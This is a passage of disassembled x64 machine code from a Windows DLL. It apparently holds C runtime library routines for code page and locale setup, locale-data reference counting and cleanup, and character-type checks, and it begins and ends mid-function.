   180005024:	4d 03 cc             	add    %r12,%r9
   180005027:	3b d0                	cmp    %eax,%edx
   180005029:	76 ec                	jbe    0x180005017
   18000502b:	48 83 c1 02          	add    $0x2,%rcx
   18000502f:	38 19                	cmp    %bl,(%rcx)
   180005031:	75 cf                	jne    0x180005002
   180005033:	49 83 c0 08          	add    $0x8,%r8
   180005037:	4d 03 dc             	add    %r12,%r11
   18000503a:	49 2b ec             	sub    %r12,%rbp
   18000503d:	75 bb                	jne    0x180004ffa
   18000503f:	89 7e 04             	mov    %edi,0x4(%rsi)
   180005042:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   180005048:	44 89 66 08          	mov    %r12d,0x8(%rsi)
   18000504c:	74 23                	je     0x180005071
   18000504e:	83 ef 04             	sub    $0x4,%edi
   180005051:	74 17                	je     0x18000506a
   180005053:	83 ef 0d             	sub    $0xd,%edi
   180005056:	74 0b                	je     0x180005063
   180005058:	ff cf                	dec    %edi
   18000505a:	75 1a                	jne    0x180005076
   18000505c:	bb 04 04 00 00       	mov    $0x404,%ebx
   180005061:	eb 13                	jmp    0x180005076
   180005063:	bb 12 04 00 00       	mov    $0x412,%ebx
   180005068:	eb 0c                	jmp    0x180005076
   18000506a:	bb 04 08 00 00       	mov    $0x804,%ebx
   18000506f:	eb 05                	jmp    0x180005076
   180005071:	bb 11 04 00 00       	mov    $0x411,%ebx
   180005076:	4c 2b d6             	sub    %rsi,%r10
   180005079:	89 5e 0c             	mov    %ebx,0xc(%rsi)
   18000507c:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
   180005080:	4b 8d 7c 2a f4       	lea    -0xc(%r10,%r13,1),%rdi
   180005085:	ba 06 00 00 00       	mov    $0x6,%edx
   18000508a:	0f b7 04 0f          	movzwl (%rdi,%rcx,1),%eax
   18000508e:	66 89 01             	mov    %ax,(%rcx)
   180005091:	48 83 c1 02          	add    $0x2,%rcx
   180005095:	49 2b d4             	sub    %r12,%rdx
   180005098:	75 f0                	jne    0x18000508a
   18000509a:	48 8b ce             	mov    %rsi,%rcx
   18000509d:	e8 72 fa ff ff       	call   0x180004b14
   1800050a2:	33 c0                	xor    %eax,%eax
   1800050a4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1800050a9:	48 33 cc             	xor    %rsp,%rcx
   1800050ac:	e8 af 09 00 00       	call   0x180005a60
   1800050b1:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1800050b8:	00 
   1800050b9:	48 83 c4 40          	add    $0x40,%rsp
   1800050bd:	41 5d                	pop    %r13
   1800050bf:	41 5c                	pop    %r12
   1800050c1:	5f                   	pop    %rdi
   1800050c2:	5e                   	pop    %rsi
   1800050c3:	5d                   	pop    %rbp
   1800050c4:	c3                   	ret
   1800050c5:	cc                   	int3
   1800050c6:	cc                   	int3
   1800050c7:	cc                   	int3
   1800050c8:	48 8b c4             	mov    %rsp,%rax
   1800050cb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800050cf:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1800050d3:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1800050d7:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1800050db:	41 55                	push   %r13
   1800050dd:	48 83 ec 30          	sub    $0x30,%rsp
   1800050e1:	8b f9                	mov    %ecx,%edi
   1800050e3:	41 83 cd ff          	or     $0xffffffff,%r13d
   1800050e7:	e8 b0 d9 ff ff       	call   0x180002a9c
   1800050ec:	48 8b f0             	mov    %rax,%rsi
   1800050ef:	e8 10 fc ff ff       	call   0x180004d04
   1800050f4:	48 8b 9e b8 00 00 00 	mov    0xb8(%rsi),%rbx
   1800050fb:	8b cf                	mov    %edi,%ecx
   1800050fd:	e8 be fc ff ff       	call   0x180004dc0
   180005102:	44 8b e0             	mov    %eax,%r12d
   180005105:	3b 43 04             	cmp    0x4(%rbx),%eax
   180005108:	0f 84 75 01 00 00    	je     0x180005283
   18000510e:	b9 20 02 00 00       	mov    $0x220,%ecx
   180005113:	e8 e0 db ff ff       	call   0x180002cf8
   180005118:	48 8b d8             	mov    %rax,%rbx
   18000511b:	33 ff                	xor    %edi,%edi
   18000511d:	48 85 c0             	test   %rax,%rax
   180005120:	0f 84 62 01 00 00    	je     0x180005288
   180005126:	48 8b 96 b8 00 00 00 	mov    0xb8(%rsi),%rdx
   18000512d:	48 8b c8             	mov    %rax,%rcx
   180005130:	41 b8 20 02 00 00    	mov    $0x220,%r8d
   180005136:	e8 25 23 00 00       	call   0x180007460
   18000513b:	89 3b                	mov    %edi,(%rbx)
   18000513d:	48 8b d3             	mov    %rbx,%rdx
   180005140:	41 8b cc             	mov    %r12d,%ecx
   180005143:	e8 08 fd ff ff       	call   0x180004e50
   180005148:	44 8b e8             	mov    %eax,%r13d
   18000514b:	85 c0                	test   %eax,%eax
   18000514d:	0f 85 0a 01 00 00    	jne    0x18000525d
   180005153:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   18000515a:	4c 8d 25 4f 74 00 00 	lea    0x744f(%rip),%r12        # 0x18000c5b0
   180005161:	f0 ff 09             	lock decl (%rcx)
   180005164:	75 11                	jne    0x180005177
   180005166:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   18000516d:	49 3b cc             	cmp    %r12,%rcx
   180005170:	74 05                	je     0x180005177
   180005172:	e8 41 db ff ff       	call   0x180002cb8
   180005177:	48 89 9e b8 00 00 00 	mov    %rbx,0xb8(%rsi)
   18000517e:	f0 ff 03             	lock incl (%rbx)
   180005181:	f6 86 c8 00 00 00 02 	testb  $0x2,0xc8(%rsi)
   180005188:	0f 85 fa 00 00 00    	jne    0x180005288
   18000518e:	f6 05 4b 79 00 00 01 	testb  $0x1,0x794b(%rip)        # 0x18000cae0
   180005195:	0f 85 ed 00 00 00    	jne    0x180005288
   18000519b:	be 0d 00 00 00       	mov    $0xd,%esi
   1800051a0:	8b ce                	mov    %esi,%ecx
   1800051a2:	e8 39 0c 00 00       	call   0x180005de0
   1800051a7:	90                   	nop
   1800051a8:	8b 43 04             	mov    0x4(%rbx),%eax
   1800051ab:	89 05 bb 83 00 00    	mov    %eax,0x83bb(%rip)        # 0x18000d56c
   1800051b1:	8b 43 08             	mov    0x8(%rbx),%eax
   1800051b4:	89 05 b6 83 00 00    	mov    %eax,0x83b6(%rip)        # 0x18000d570
   1800051ba:	8b 43 0c             	mov    0xc(%rbx),%eax
   1800051bd:	89 05 b1 83 00 00    	mov    %eax,0x83b1(%rip)        # 0x18000d574
   1800051c3:	8b d7                	mov    %edi,%edx
   1800051c5:	4c 8d 05 34 ae ff ff 	lea    -0x51cc(%rip),%r8        # 0x180000000
   1800051cc:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1800051d0:	83 fa 05             	cmp    $0x5,%edx
   1800051d3:	7d 15                	jge    0x1800051ea
   1800051d5:	48 63 ca             	movslq %edx,%rcx
   1800051d8:	0f b7 44 4b 10       	movzwl 0x10(%rbx,%rcx,2),%eax
   1800051dd:	66 41 89 84 48 60 d5 	mov    %ax,0xd560(%r8,%rcx,2)
   1800051e4:	00 00 
   1800051e6:	ff c2                	inc    %edx
   1800051e8:	eb e2                	jmp    0x1800051cc
   1800051ea:	8b d7                	mov    %edi,%edx
   1800051ec:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1800051f0:	81 fa 01 01 00 00    	cmp    $0x101,%edx
   1800051f6:	7d 13                	jge    0x18000520b
   1800051f8:	48 63 ca             	movslq %edx,%rcx
   1800051fb:	8a 44 19 1c          	mov    0x1c(%rcx,%rbx,1),%al
   1800051ff:	42 88 84 01 d0 c7 00 	mov    %al,0xc7d0(%rcx,%r8,1)
   180005206:	00 
   180005207:	ff c2                	inc    %edx
   180005209:	eb e1                	jmp    0x1800051ec
   18000520b:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   18000520f:	81 ff 00 01 00 00    	cmp    $0x100,%edi
   180005215:	7d 16                	jge    0x18000522d
   180005217:	48 63 cf             	movslq %edi,%rcx
   18000521a:	8a 84 19 1d 01 00 00 	mov    0x11d(%rcx,%rbx,1),%al
   180005221:	42 88 84 01 e0 c8 00 	mov    %al,0xc8e0(%rcx,%r8,1)
   180005228:	00 
   180005229:	ff c7                	inc    %edi
   18000522b:	eb de                	jmp    0x18000520b
   18000522d:	48 8b 05 ac 77 00 00 	mov    0x77ac(%rip),%rax        # 0x18000c9e0
   180005234:	f0 ff 08             	lock decl (%rax)
   180005237:	75 11                	jne    0x18000524a
   180005239:	48 8b 0d a0 77 00 00 	mov    0x77a0(%rip),%rcx        # 0x18000c9e0
   180005240:	49 3b cc             	cmp    %r12,%rcx
   180005243:	74 05                	je     0x18000524a
   180005245:	e8 6e da ff ff       	call   0x180002cb8
   18000524a:	48 89 1d 8f 77 00 00 	mov    %rbx,0x778f(%rip)        # 0x18000c9e0
   180005251:	f0 ff 03             	lock incl (%rbx)
   180005254:	8b ce                	mov    %esi,%ecx
   180005256:	e8 85 0a 00 00       	call   0x180005ce0
   18000525b:	eb 2b                	jmp    0x180005288
   18000525d:	83 f8 ff             	cmp    $0xffffffff,%eax
   180005260:	75 26                	jne    0x180005288
   180005262:	4c 8d 25 47 73 00 00 	lea    0x7347(%rip),%r12        # 0x18000c5b0
   180005269:	49 3b dc             	cmp    %r12,%rbx
   18000526c:	74 08                	je     0x180005276
   18000526e:	48 8b cb             	mov    %rbx,%rcx
   180005271:	e8 42 da ff ff       	call   0x180002cb8
   180005276:	e8 25 d4 ff ff       	call   0x1800026a0
   18000527b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180005281:	eb 05                	jmp    0x180005288
   180005283:	33 ff                	xor    %edi,%edi
   180005285:	44 8b ef             	mov    %edi,%r13d
   180005288:	41 8b c5             	mov    %r13d,%eax
   18000528b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180005290:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180005295:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   18000529a:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   18000529f:	48 83 c4 30          	add    $0x30,%rsp
   1800052a3:	41 5d                	pop    %r13
   1800052a5:	c3                   	ret
   1800052a6:	cc                   	int3
   1800052a7:	cc                   	int3
   1800052a8:	48 83 ec 28          	sub    $0x28,%rsp
   1800052ac:	83 3d 85 a3 00 00 00 	cmpl   $0x0,0xa385(%rip)        # 0x18000f638
   1800052b3:	75 14                	jne    0x1800052c9
   1800052b5:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   1800052ba:	e8 09 fe ff ff       	call   0x1800050c8
   1800052bf:	c7 05 6f a3 00 00 01 	movl   $0x1,0xa36f(%rip)        # 0x18000f638
   1800052c6:	00 00 00 
   1800052c9:	33 c0                	xor    %eax,%eax
   1800052cb:	48 83 c4 28          	add    $0x28,%rsp
   1800052cf:	c3                   	ret
   1800052d0:	f0 ff 01             	lock incl (%rcx)
   1800052d3:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   1800052da:	48 85 c0             	test   %rax,%rax
   1800052dd:	74 03                	je     0x1800052e2
   1800052df:	f0 ff 00             	lock incl (%rax)
   1800052e2:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   1800052e9:	48 85 c0             	test   %rax,%rax
   1800052ec:	74 03                	je     0x1800052f1
   1800052ee:	f0 ff 00             	lock incl (%rax)
   1800052f1:	48 8b 81 18 01 00 00 	mov    0x118(%rcx),%rax
   1800052f8:	48 85 c0             	test   %rax,%rax
   1800052fb:	74 03                	je     0x180005300
   1800052fd:	f0 ff 00             	lock incl (%rax)
   180005300:	48 8b 81 30 01 00 00 	mov    0x130(%rcx),%rax
   180005307:	48 85 c0             	test   %rax,%rax
   18000530a:	74 03                	je     0x18000530f
   18000530c:	f0 ff 00             	lock incl (%rax)
   18000530f:	48 8d 41 58          	lea    0x58(%rcx),%rax
   180005313:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   180005319:	48 8d 15 c4 77 00 00 	lea    0x77c4(%rip),%rdx        # 0x18000cae4
   180005320:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   180005324:	74 0b                	je     0x180005331
   180005326:	48 8b 10             	mov    (%rax),%rdx
   180005329:	48 85 d2             	test   %rdx,%rdx
   18000532c:	74 03                	je     0x180005331
   18000532e:	f0 ff 02             	lock incl (%rdx)
   180005331:	48 83 78 f8 00       	cmpq   $0x0,-0x8(%rax)
   180005336:	74 0c                	je     0x180005344
   180005338:	48 8b 50 08          	mov    0x8(%rax),%rdx
   18000533c:	48 85 d2             	test   %rdx,%rdx
   18000533f:	74 03                	je     0x180005344
   180005341:	f0 ff 02             	lock incl (%rdx)
   180005344:	48 83 c0 20          	add    $0x20,%rax
   180005348:	49 ff c8             	dec    %r8
   18000534b:	75 cc                	jne    0x180005319
   18000534d:	48 8b 81 58 01 00 00 	mov    0x158(%rcx),%rax
   180005354:	f0 ff 80 60 01 00 00 	lock incl 0x160(%rax)
   18000535b:	c3                   	ret
   18000535c:	48 85 c9             	test   %rcx,%rcx
   18000535f:	0f 84 97 00 00 00    	je     0x1800053fc
   180005365:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180005369:	f0 44 01 09          	lock add %r9d,(%rcx)
   18000536d:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   180005374:	48 85 c0             	test   %rax,%rax
   180005377:	74 04                	je     0x18000537d
   180005379:	f0 44 01 08          	lock add %r9d,(%rax)
   18000537d:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   180005384:	48 85 c0             	test   %rax,%rax
   180005387:	74 04                	je     0x18000538d
   180005389:	f0 44 01 08          	lock add %r9d,(%rax)
   18000538d:	48 8b 81 18 01 00 00 	mov    0x118(%rcx),%rax
   180005394:	48 85 c0             	test   %rax,%rax
   180005397:	74 04                	je     0x18000539d
   180005399:	f0 44 01 08          	lock add %r9d,(%rax)
   18000539d:	48 8b 81 30 01 00 00 	mov    0x130(%rcx),%rax
   1800053a4:	48 85 c0             	test   %rax,%rax
   1800053a7:	74 04                	je     0x1800053ad
   1800053a9:	f0 44 01 08          	lock add %r9d,(%rax)
   1800053ad:	48 8d 41 58          	lea    0x58(%rcx),%rax
   1800053b1:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1800053b7:	48 8d 15 26 77 00 00 	lea    0x7726(%rip),%rdx        # 0x18000cae4
   1800053be:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   1800053c2:	74 0c                	je     0x1800053d0
   1800053c4:	48 8b 10             	mov    (%rax),%rdx
   1800053c7:	48 85 d2             	test   %rdx,%rdx
   1800053ca:	74 04                	je     0x1800053d0
   1800053cc:	f0 44 01 0a          	lock add %r9d,(%rdx)
   1800053d0:	48 83 78 f8 00       	cmpq   $0x0,-0x8(%rax)
   1800053d5:	74 0d                	je     0x1800053e4
   1800053d7:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1800053db:	48 85 d2             	test   %rdx,%rdx
   1800053de:	74 04                	je     0x1800053e4
   1800053e0:	f0 44 01 0a          	lock add %r9d,(%rdx)
   1800053e4:	48 83 c0 20          	add    $0x20,%rax
   1800053e8:	49 ff c8             	dec    %r8
   1800053eb:	75 ca                	jne    0x1800053b7
   1800053ed:	48 8b 81 58 01 00 00 	mov    0x158(%rcx),%rax
   1800053f4:	f0 44 01 88 60 01 00 	lock add %r9d,0x160(%rax)
   1800053fb:	00 
   1800053fc:	48 8b c1             	mov    %rcx,%rax
   1800053ff:	c3                   	ret
   180005400:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005405:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000540a:	57                   	push   %rdi
   18000540b:	48 83 ec 20          	sub    $0x20,%rsp
   18000540f:	48 8b 81 28 01 00 00 	mov    0x128(%rcx),%rax
   180005416:	48 8b d9             	mov    %rcx,%rbx
   180005419:	48 85 c0             	test   %rax,%rax
   18000541c:	74 79                	je     0x180005497
   18000541e:	48 8d 0d ab 7d 00 00 	lea    0x7dab(%rip),%rcx        # 0x18000d1d0
   180005425:	48 3b c1             	cmp    %rcx,%rax
   180005428:	74 6d                	je     0x180005497
   18000542a:	48 8b 83 10 01 00 00 	mov    0x110(%rbx),%rax
   180005431:	48 85 c0             	test   %rax,%rax
   180005434:	74 61                	je     0x180005497
   180005436:	83 38 00             	cmpl   $0x0,(%rax)
   180005439:	75 5c                	jne    0x180005497
   18000543b:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   180005442:	48 85 c9             	test   %rcx,%rcx
   180005445:	74 16                	je     0x18000545d
   180005447:	83 39 00             	cmpl   $0x0,(%rcx)
   18000544a:	75 11                	jne    0x18000545d
   18000544c:	e8 67 d8 ff ff       	call   0x180002cb8
   180005451:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   180005458:	e8 93 27 00 00       	call   0x180007bf0
   18000545d:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   180005464:	48 85 c9             	test   %rcx,%rcx
   180005467:	74 16                	je     0x18000547f
   180005469:	83 39 00             	cmpl   $0x0,(%rcx)
   18000546c:	75 11                	jne    0x18000547f
   18000546e:	e8 45 d8 ff ff       	call   0x180002cb8
   180005473:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   18000547a:	e8 05 27 00 00       	call   0x180007b84
   18000547f:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   180005486:	e8 2d d8 ff ff       	call   0x180002cb8
   18000548b:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   180005492:	e8 21 d8 ff ff       	call   0x180002cb8
   180005497:	48 8b 83 30 01 00 00 	mov    0x130(%rbx),%rax
   18000549e:	48 85 c0             	test   %rax,%rax
   1800054a1:	74 47                	je     0x1800054ea
   1800054a3:	83 38 00             	cmpl   $0x0,(%rax)
   1800054a6:	75 42                	jne    0x1800054ea
   1800054a8:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   1800054af:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   1800054b6:	e8 fd d7 ff ff       	call   0x180002cb8
   1800054bb:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   1800054c2:	bf 80 00 00 00       	mov    $0x80,%edi
   1800054c7:	48 2b cf             	sub    %rdi,%rcx
   1800054ca:	e8 e9 d7 ff ff       	call   0x180002cb8
   1800054cf:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   1800054d6:	48 2b cf             	sub    %rdi,%rcx
   1800054d9:	e8 da d7 ff ff       	call   0x180002cb8
   1800054de:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   1800054e5:	e8 ce d7 ff ff       	call   0x180002cb8
   1800054ea:	48 8b 8b 58 01 00 00 	mov    0x158(%rbx),%rcx
   1800054f1:	48 8d 05 f8 75 00 00 	lea    0x75f8(%rip),%rax        # 0x18000caf0
   1800054f8:	48 3b c8             	cmp    %rax,%rcx
   1800054fb:	74 1a                	je     0x180005517
   1800054fd:	83 b9 60 01 00 00 00 	cmpl   $0x0,0x160(%rcx)
   180005504:	75 11                	jne    0x180005517
   180005506:	e8 89 22 00 00       	call   0x180007794
   18000550b:	48 8b 8b 58 01 00 00 	mov    0x158(%rbx),%rcx
   180005512:	e8 a1 d7 ff ff       	call   0x180002cb8
   180005517:	48 8d 7b 58          	lea    0x58(%rbx),%rdi
   18000551b:	be 06 00 00 00       	mov    $0x6,%esi
   180005520:	48 8d 05 bd 75 00 00 	lea    0x75bd(%rip),%rax        # 0x18000cae4
   180005527:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   18000552b:	74 12                	je     0x18000553f
   18000552d:	48 8b 0f             	mov    (%rdi),%rcx
   180005530:	48 85 c9             	test   %rcx,%rcx
   180005533:	74 0a                	je     0x18000553f
   180005535:	83 39 00             	cmpl   $0x0,(%rcx)
   180005538:	75 05                	jne    0x18000553f
   18000553a:	e8 79 d7 ff ff       	call   0x180002cb8
   18000553f:	48 83 7f f8 00       	cmpq   $0x0,-0x8(%rdi)
   180005544:	74 13                	je     0x180005559
   180005546:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   18000554a:	48 85 c9             	test   %rcx,%rcx
   18000554d:	74 0a                	je     0x180005559
   18000554f:	83 39 00             	cmpl   $0x0,(%rcx)
   180005552:	75 05                	jne    0x180005559
   180005554:	e8 5f d7 ff ff       	call   0x180002cb8
   180005559:	48 83 c7 20          	add    $0x20,%rdi
   18000555d:	48 ff ce             	dec    %rsi
   180005560:	75 be                	jne    0x180005520
   180005562:	48 8b cb             	mov    %rbx,%rcx
   180005565:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000556a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000556f:	48 83 c4 20          	add    $0x20,%rsp
   180005573:	5f                   	pop    %rdi
   180005574:	e9 3f d7 ff ff       	jmp    0x180002cb8
   180005579:	cc                   	int3
   18000557a:	cc                   	int3
   18000557b:	cc                   	int3
   18000557c:	40 53                	rex push %rbx
   18000557e:	48 83 ec 20          	sub    $0x20,%rsp
   180005582:	48 8b da             	mov    %rdx,%rbx
   180005585:	48 85 d2             	test   %rdx,%rdx
   180005588:	74 41                	je     0x1800055cb
   18000558a:	48 85 c9             	test   %rcx,%rcx
   18000558d:	74 3c                	je     0x1800055cb
   18000558f:	4c 8b 11             	mov    (%rcx),%r10
   180005592:	4c 3b d2             	cmp    %rdx,%r10
   180005595:	74 2f                	je     0x1800055c6
   180005597:	48 89 11             	mov    %rdx,(%rcx)
   18000559a:	48 8b ca             	mov    %rdx,%rcx
   18000559d:	e8 2e fd ff ff       	call   0x1800052d0
   1800055a2:	4d 85 d2             	test   %r10,%r10
   1800055a5:	74 1f                	je     0x1800055c6
   1800055a7:	49 8b ca             	mov    %r10,%rcx
   1800055aa:	e8 ad fd ff ff       	call   0x18000535c
   1800055af:	41 83 3a 00          	cmpl   $0x0,(%r10)
   1800055b3:	75 11                	jne    0x1800055c6
   1800055b5:	48 8d 05 f4 77 00 00 	lea    0x77f4(%rip),%rax        # 0x18000cdb0
   1800055bc:	4c 3b d0             	cmp    %rax,%r10
   1800055bf:	74 05                	je     0x1800055c6
   1800055c1:	e8 3a fe ff ff       	call   0x180005400
   1800055c6:	48 8b c3             	mov    %rbx,%rax
   1800055c9:	eb 02                	jmp    0x1800055cd
   1800055cb:	33 c0                	xor    %eax,%eax
   1800055cd:	48 83 c4 20          	add    $0x20,%rsp
   1800055d1:	5b                   	pop    %rbx
   1800055d2:	c3                   	ret
   1800055d3:	cc                   	int3
   1800055d4:	40 53                	rex push %rbx
   1800055d6:	48 83 ec 20          	sub    $0x20,%rsp
   1800055da:	e8 bd d4 ff ff       	call   0x180002a9c
   1800055df:	48 8b d8             	mov    %rax,%rbx
   1800055e2:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   1800055e8:	85 0d f2 74 00 00    	test   %ecx,0x74f2(%rip)        # 0x18000cae0
   1800055ee:	74 18                	je     0x180005608
   1800055f0:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   1800055f7:	00 
   1800055f8:	74 0e                	je     0x180005608
   1800055fa:	e8 9d d4 ff ff       	call   0x180002a9c
   1800055ff:	48 8b 98 c0 00 00 00 	mov    0xc0(%rax),%rbx
   180005606:	eb 2b                	jmp    0x180005633
   180005608:	b9 0c 00 00 00       	mov    $0xc,%ecx
   18000560d:	e8 ce 07 00 00       	call   0x180005de0
   180005612:	90                   	nop
   180005613:	48 8d 8b c0 00 00 00 	lea    0xc0(%rbx),%rcx
   18000561a:	48 8b 15 ef 78 00 00 	mov    0x78ef(%rip),%rdx        # 0x18000cf10
   180005621:	e8 56 ff ff ff       	call   0x18000557c
   180005626:	48 8b d8             	mov    %rax,%rbx
   180005629:	b9 0c 00 00 00       	mov    $0xc,%ecx
   18000562e:	e8 ad 06 00 00       	call   0x180005ce0
   180005633:	48 85 db             	test   %rbx,%rbx
   180005636:	75 08                	jne    0x180005640
   180005638:	8d 4b 20             	lea    0x20(%rbx),%ecx
   18000563b:	e8 c0 db ff ff       	call   0x180003200
   180005640:	48 8b c3             	mov    %rbx,%rax
   180005643:	48 83 c4 20          	add    $0x20,%rsp
   180005647:	5b                   	pop    %rbx
   180005648:	c3                   	ret
   180005649:	cc                   	int3
   18000564a:	cc                   	int3
   18000564b:	cc                   	int3
   18000564c:	40 53                	rex push %rbx
   18000564e:	48 83 ec 20          	sub    $0x20,%rsp
   180005652:	45 8b 18             	mov    (%r8),%r11d
   180005655:	48 8b da             	mov    %rdx,%rbx
   180005658:	4c 8b c9             	mov    %rcx,%r9
   18000565b:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   18000565f:	41 f6 00 04          	testb  $0x4,(%r8)
   180005663:	4c 8b d1             	mov    %rcx,%r10
   180005666:	74 13                	je     0x18000567b
   180005668:	41 8b 40 08          	mov    0x8(%r8),%eax
   18000566c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   180005670:	f7 d8                	neg    %eax
   180005672:	4c 03 d1             	add    %rcx,%r10
   180005675:	48 63 c8             	movslq %eax,%rcx
   180005678:	4c 23 d1             	and    %rcx,%r10
   18000567b:	49 63 c3             	movslq %r11d,%rax
   18000567e:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   180005682:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180005686:	8b 48 08             	mov    0x8(%rax),%ecx
   180005689:	48 03 4b 08          	add    0x8(%rbx),%rcx
   18000568d:	f6 41 03 0f          	testb  $0xf,0x3(%rcx)
   180005691:	74 0c                	je     0x18000569f
   180005693:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   180005697:	83 e0 f0             	and    $0xfffffff0,%eax
   18000569a:	48 98                	cltq
   18000569c:	4c 03 c8             	add    %rax,%r9
   18000569f:	4c 33 ca             	xor    %rdx,%r9
   1800056a2:	49 8b c9             	mov    %r9,%rcx
   1800056a5:	48 83 c4 20          	add    $0x20,%rsp
   1800056a9:	5b                   	pop    %rbx
   1800056aa:	e9 b1 03 00 00       	jmp    0x180005a60
   1800056af:	cc                   	int3
   1800056b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800056b4:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1800056b8:	48 8b ca             	mov    %rdx,%rcx
   1800056bb:	49 8b d1             	mov    %r9,%rdx
   1800056be:	e8 89 ff ff ff       	call   0x18000564c
   1800056c3:	b8 01 00 00 00       	mov    $0x1,%eax
   1800056c8:	48 83 c4 28          	add    $0x28,%rsp
   1800056cc:	c3                   	ret
   1800056cd:	cc                   	int3
   1800056ce:	cc                   	int3
   1800056cf:	cc                   	int3
   1800056d0:	40 53                	rex push %rbx
   1800056d2:	48 83 ec 40          	sub    $0x40,%rsp
   1800056d6:	8b d9                	mov    %ecx,%ebx
   1800056d8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800056dd:	e8 da c0 ff ff       	call   0x1800017bc
   1800056e2:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1800056e7:	44 0f b6 db          	movzbl %bl,%r11d
   1800056eb:	48 8b 88 40 01 00 00 	mov    0x140(%rax),%rcx
   1800056f2:	42 0f b7 04 59       	movzwl (%rcx,%r11,2),%eax
   1800056f7:	25 00 80 00 00       	and    $0x8000,%eax
   1800056fc:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180005701:	74 0c                	je     0x18000570f
   180005703:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180005708:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000570f:	48 83 c4 40          	add    $0x40,%rsp
   180005713:	5b                   	pop    %rbx
   180005714:	c3                   	ret
   180005715:	cc                   	int3
   180005716:	cc                   	int3
   180005717:	cc                   	int3
   180005718:	40 53                	rex push %rbx
   18000571a:	48 83 ec 40          	sub    $0x40,%rsp
   18000571e:	8b d9                	mov    %ecx,%ebx
   180005720:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180005725:	33 d2                	xor    %edx,%edx
   180005727:	e8 90 c0 ff ff       	call   0x1800017bc
   18000572c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180005731:	44 0f b6 db          	movzbl %bl,%r11d
   180005735:	48 8b 88 40 01 00 00 	mov    0x140(%rax),%rcx
   18000573c:	42 0f b7 04 59       	movzwl (%rcx,%r11,2),%eax
   180005741:	25 00 80 00 00       	and    $0x8000,%eax
   180005746:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000574b:	74 0c                	je     0x180005759
   18000574d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180005752:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180005759:	48 83 c4 40          	add    $0x40,%rsp
   18000575d:	5b                   	pop    %rbx
   18000575e:	c3                   	ret
   18000575f:	cc                   	int3
   180005760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005765:	57                   	push   %rdi
   180005766:	48 83 ec 20          	sub    $0x20,%rsp
   18000576a:	48 8d 1d af 77 00 00 	lea    0x77af(%rip),%rbx        # 0x18000cf20
   180005771:	bf 0a 00 00 00       	mov    $0xa,%edi
   180005776:	48 8b 0b             	mov    (%rbx),%rcx
   180005779:	ff 15 11 39 00 00    	call   *0x3911(%rip)        # 0x180009090
   18000577f:	48 89 03             	mov    %rax,(%rbx)
   180005782:	48 83 c3 08          	add    $0x8,%rbx
   180005786:	48 ff cf             	dec    %rdi
   180005789:	75 eb                	jne    0x180005776
